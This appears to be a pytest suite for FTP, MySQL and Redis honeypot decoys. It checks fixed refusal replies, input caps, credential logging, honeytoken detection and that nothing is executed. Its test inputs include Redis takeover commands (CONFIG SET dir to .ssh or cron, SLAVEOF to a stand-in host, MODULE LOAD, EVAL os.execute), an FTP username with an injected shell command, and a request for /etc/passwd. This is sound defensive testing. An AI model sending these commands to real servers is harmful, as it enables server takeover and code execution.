"""P1.4: the FTP, MySQL and Redis decoys hold a short, bounded, fixed-reply dialogue."""

# ruff: noqa: S324
import asyncio
import hashlib
import os
import struct

from decoys import honeytokens
from decoys.banners import dialogues, listeners
from qlure.correlate.engine import correlate
from qlure.events import Event, Service

IP = "198.51.100.9"
PROXY = f"PROXY TCP4 {IP} 10.0.0.1 51000 2121\r\n".encode()


async def _session(service, greeting, steps, wait_close=True):
    """Send each step, collect whatever comes back after it, and return all replies."""
    server = await listeners.start(service, 0, greeting, host="127.0.0.1")
    port = server.sockets[0].getsockname()[1]
    reader, writer = await asyncio.open_connection("127.0.0.1", port)
    writer.write(PROXY)
    replies = []
    for step in steps:
        writer.write(step)
        await writer.drain()
        await asyncio.sleep(0.15)
    writer.write_eof() if writer.can_write_eof() else None
    try:
        while chunk := await asyncio.wait_for(reader.read(65536), 5):
            replies.append(chunk)
    except TimeoutError:
        pass
    writer.close()
    await asyncio.sleep(0.1)
    server.close()
    return b"".join(replies)


def _run(service, greeting, steps):
    return asyncio.run(_session(service, greeting, steps))


def _all(read_events):
    events: list[Event] = []
    for service in Service:
        events += read_events(service.value)
    return events


def _of(events, action):
    return [e for e in events if e.action.value == action]


# FTP


def test_ftp_user_pass_is_refused_and_logged(log_dir, read_events):
    out = _run(
        Service.FTP, listeners.FTP_BANNER, [b"USER admin\r\n", b"PASS hunter2\r\n", b"QUIT\r\n"]
    )
    assert out == (
        listeners.FTP_BANNER
        + b"331 Please specify the password.\r\n530 Login incorrect.\r\n221 Goodbye.\r\n"
    )
    events = read_events("ftp")
    assert [e.action.value for e in events] == ["connect", "banner", "login_attempt", "disconnect"]
    attempt = events[2]
    assert attempt.src_ip == IP
    assert (attempt.credential.username, attempt.credential.password) == ("admin", "hunter2")


def test_ftp_other_commands_get_the_fixed_reply_and_are_capped(log_dir, read_events):
    out = _run(Service.FTP, listeners.FTP_BANNER, [b"SYST\r\n", b"RETR /etc/passwd\r\n"])
    assert out.count(b"530 Please login with USER and PASS.\r\n") == 2
    assert b"passwd" not in out
    # only 8 commands are served; the long line and ninth command get nothing
    out = _run(Service.FTP, listeners.FTP_BANNER, [b"NOOP\r\n" * 12])
    assert out.count(b"530 Please login") == 8
    out = _run(Service.FTP, listeners.FTP_BANNER, [b"A" * 600 + b"\r\n"])
    assert out == listeners.FTP_BANNER


def test_ftp_password_and_name_are_capped(log_dir, read_events):
    _run(
        Service.FTP,
        listeners.FTP_BANNER,
        [b"USER " + b"u" * 300 + b"\r\n", b"PASS " + b"p" * 400 + b"\r\n"],
    )
    credential = _of(read_events("ftp"), "login_attempt")[0].credential
    assert len(credential.username) == 64
    assert len(credential.password) == 128


def test_ftp_matching_a_planted_password_is_honeytoken_use(log_dir, read_events):
    value = honeytokens.get("ht-ssh-001")["value"]
    _run(Service.FTP, listeners.FTP_BANNER, [b"USER deploy\r\n", f"PASS {value}\r\n".encode()])
    events = read_events("ftp")
    assert _of(events, "login_attempt")[0].honeytoken_id == "ht-ssh-001"
    assert [e.honeytoken_id for e in _of(events, "honeytoken_use")] == ["ht-ssh-001"]


# MySQL


def _handshake_response(name: bytes, auth: bytes, seq: int = 1) -> bytes:
    flags = 0x0200 | 0x8000 | 0x80000
    payload = (
        struct.pack("<II", flags, 1 << 24)
        + bytes([33])
        + b"\x00" * 23
        + name
        + b"\x00"
        + bytes([len(auth)])
        + auth
        + b"mysql_native_password\x00"
    )
    return len(payload).to_bytes(3, "little") + bytes([seq]) + payload


def _native(password: str, salt: bytes) -> bytes:
    stage1 = hashlib.sha1(password.encode()).digest()
    mask = hashlib.sha1(salt + hashlib.sha1(stage1).digest()).digest()
    return bytes(a ^ b for a, b in zip(stage1, mask, strict=True))


def _split_error(out: bytes, greeting_len: int):
    packet = out[greeting_len:]
    size = int.from_bytes(packet[:3], "little")
    assert len(packet) == 4 + size  # properly framed, nothing after it
    return packet[3], packet[4:]


def test_mysql_replies_access_denied_and_logs_the_username(log_dir, read_events):
    greeting = listeners.mysql_greeting()
    out = _run(Service.MYSQL, greeting, [_handshake_response(b"bob", b"\x01" * 20)])
    assert out.startswith(greeting)
    seq, payload = _split_error(out, len(greeting))
    assert seq == 2
    assert payload[:1] == b"\xff"
    assert struct.unpack("<H", payload[1:3])[0] == 1045
    assert payload[3:9] == b"#28000"
    assert payload[9:] == f"Access denied for user 'bob'@'{IP}' (using password: YES)".encode()
    events = read_events("mysql")
    assert [e.action.value for e in events] == ["connect", "banner", "login_attempt", "disconnect"]
    assert events[2].credential.username == "bob"
    assert events[2].request == {"auth_response_len": 20}


def test_mysql_no_password_and_hostile_name(log_dir, read_events):
    greeting = listeners.mysql_greeting()
    name = b"x\x1b[31m" + b"n" * 200
    out = _run(Service.MYSQL, greeting, [_handshake_response(name, b"")])
    _, payload = _split_error(out, len(greeting))
    assert payload.endswith(b"(using password: NO)")
    shown = payload[9:].split(b"'")[1].decode()
    assert len(shown) == 64
    assert shown.isprintable()
    assert len(_of(read_events("mysql"), "login_attempt")[0].credential.username) == 64


def test_mysql_unparseable_response_is_logged_raw_and_closed(log_dir, read_events):
    greeting = listeners.mysql_greeting()
    out = _run(Service.MYSQL, greeting, [b"\x05\x00\x00\x01hello"])
    assert out == greeting
    events = read_events("mysql")
    assert [e.action.value for e in events] == ["connect", "banner", "disconnect"]
    assert events[1].request["first_bytes_preview"].endswith("hello")


def test_mysql_default_password_is_recognised_without_storing_a_hash(log_dir, read_events):
    greeting = listeners.mysql_greeting()
    salt = dialogues._scramble(greeting)
    assert salt is not None and len(salt) == 20
    _run(Service.MYSQL, greeting, [_handshake_response(b"root", _native("toor", salt))])
    credential = _of(read_events("mysql"), "login_attempt")[0].credential
    assert (credential.username, credential.password) == ("root", "toor")


# Redis


def _resp(*args: str) -> bytes:
    return b"*%d\r\n" % len(args) + b"".join(b"$%d\r\n%s\r\n" % (len(a), a.encode()) for a in args)


def test_redis_unauthenticated_commands_are_logged_and_refused(log_dir, read_events):
    steps = [
        _resp("CONFIG", "SET", "dir", "/root/.ssh"),
        b"SLAVEOF 203.0.113.5 6379\r\n",
        _resp("MODULE", "LOAD", "/opt/x.so"),
        _resp("EVAL", "return os.execute('id')", "0"),
    ]
    out = _run(Service.REDIS, b"", steps)
    assert out == listeners.REDIS_NOAUTH * 4
    commands = [e.request["command"] for e in _of(read_events("redis"), "command")]
    assert commands == [
        "CONFIG SET dir /root/.ssh",
        "SLAVEOF 203.0.113.5 6379",
        "MODULE LOAD /opt/x.so",
        "EVAL return os.execute('id') 0",
    ]


def test_redis_wrong_password_is_wrongpass_and_not_a_honeytoken(log_dir, read_events):
    out = _run(Service.REDIS, b"", [_resp("AUTH", "admin", "nope"), _resp("GET", "k")])
    assert out == dialogues.WRONGPASS + listeners.REDIS_NOAUTH
    events = read_events("redis")
    attempt = _of(events, "login_attempt")[0]
    assert (attempt.credential.username, attempt.credential.password) == ("admin", "nope")
    assert attempt.honeytoken_id is None
    assert not _of(events, "honeytoken_use")


def test_redis_planted_password_is_honeytoken_use_and_keeps_them_talking(log_dir, read_events):
    password = honeytokens.get("ht-redis-001")["value"]
    steps = [
        _resp("AUTH", password),
        _resp("CONFIG", "SET", "dir", "/var/spool/cron"),
        _resp("SLAVEOF", "203.0.113.5", "6379"),
        _resp("MODULE", "LOAD", "/opt/x.so"),
        _resp("GET", "k"),
        _resp("INFO"),
    ]
    out = _run(Service.REDIS, b"", steps)
    assert out.startswith(b"+OK\r\n+OK\r\n+OK\r\n-ERR Error loading the extension.")
    assert b"$-1\r\n" in out
    assert b"redis_version:" in out
    events = read_events("redis")
    assert [e.honeytoken_id for e in _of(events, "honeytoken_use")] == ["ht-redis-001"]
    assert not _of(events, "login_success")
    assert len(_of(events, "command")) == 5


def test_redis_inline_command_cap_and_budget(log_dir, read_events):
    out = _run(Service.REDIS, b"", [b"PING\r\n" * 20])
    assert out.count(b"-NOAUTH") == 8
    assert len(_of(read_events("redis"), "command")) == 8
    log_before = len(read_events("redis"))
    out = _run(Service.REDIS, b"", [b"*1\r\n$100000\r\n" + b"x" * 5000])
    assert out == b""
    assert len(read_events("redis")) > log_before  # connect/banner/disconnect only


def test_redis_command_text_is_capped(log_dir, read_events):
    _run(Service.REDIS, b"", [_resp("SET", "k", "v" * 900)])
    command = _of(read_events("redis"), "command")[0].request["command"]
    assert len(command) == 256


def test_slow_client_is_dropped_after_the_total_timeout(log_dir, read_events, monkeypatch):
    monkeypatch.setattr(listeners, "READ_TIMEOUT", 0.5)

    async def scenario():
        server = await listeners.start(Service.REDIS, 0, b"", host="127.0.0.1")
        port = server.sockets[0].getsockname()[1]
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        writer.write(PROXY)
        for _ in range(8):  # trickle one byte at a time, never finishing a command
            try:
                writer.write(b"P")
                await writer.drain()
            except ConnectionError:
                break  # the server already gave up on us
            await asyncio.sleep(0.15)
        try:
            closed = await asyncio.wait_for(reader.read(10), 3) == b""
        except ConnectionError:
            closed = True
        writer.close()
        server.close()
        return closed

    assert asyncio.run(scenario())
    assert [e.action.value for e in read_events("redis")][-2:] == ["banner", "disconnect"]


# Nothing is executed, correlation sees the attempts


def test_nothing_attacker_supplied_is_executed(log_dir, tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    before = set(os.listdir(tmp_path))
    marker = tmp_path / "pwned"
    password = honeytokens.get("ht-redis-001")["value"]
    _run(
        Service.REDIS,
        b"",
        [
            _resp("AUTH", password),
            _resp("CONFIG", "SET", "dir", str(tmp_path)),
            _resp("CONFIG", "SET", "dbfilename", "pwned"),
            _resp("SET", "k", "v"),
            _resp("SAVE"),
        ],
    )
    _run(Service.FTP, listeners.FTP_BANNER, [f"USER ; touch {marker}\r\n".encode()])
    assert not marker.exists()
    assert set(os.listdir(tmp_path)) - before <= {p.name for p in log_dir.iterdir()}


def test_anonymous_ftp_and_default_mysql_fire_r4_and_repeats_fire_r3(log_dir, read_events):
    _run(Service.FTP, listeners.FTP_BANNER, [b"USER anonymous\r\n", b"PASS a@b.c\r\n"])
    for name, pw in [("admin", "admin"), ("root", "root"), ("guest", "guest")]:
        _run(Service.FTP, listeners.FTP_BANNER, [f"USER {name}\r\nPASS {pw}\r\n".encode()])
    greeting = listeners.mysql_greeting()
    salt = dialogues._scramble(greeting)
    _run(Service.MYSQL, greeting, [_handshake_response(b"root", _native("root", salt))])

    ftp = [e for e in _all(read_events) if e.service is Service.FTP]
    assert len({e.session_id for e in ftp}) == 4  # one session per connection, one actor by IP
    result = correlate(_all(read_events))
    hits = {(f.session.service, h.rule_id) for f in result.findings for h in f.hits}
    assert ("mysql", "R4") in hits
    assert ("ftp", "R4") in hits
    assert ("ftp", "R3") in hits
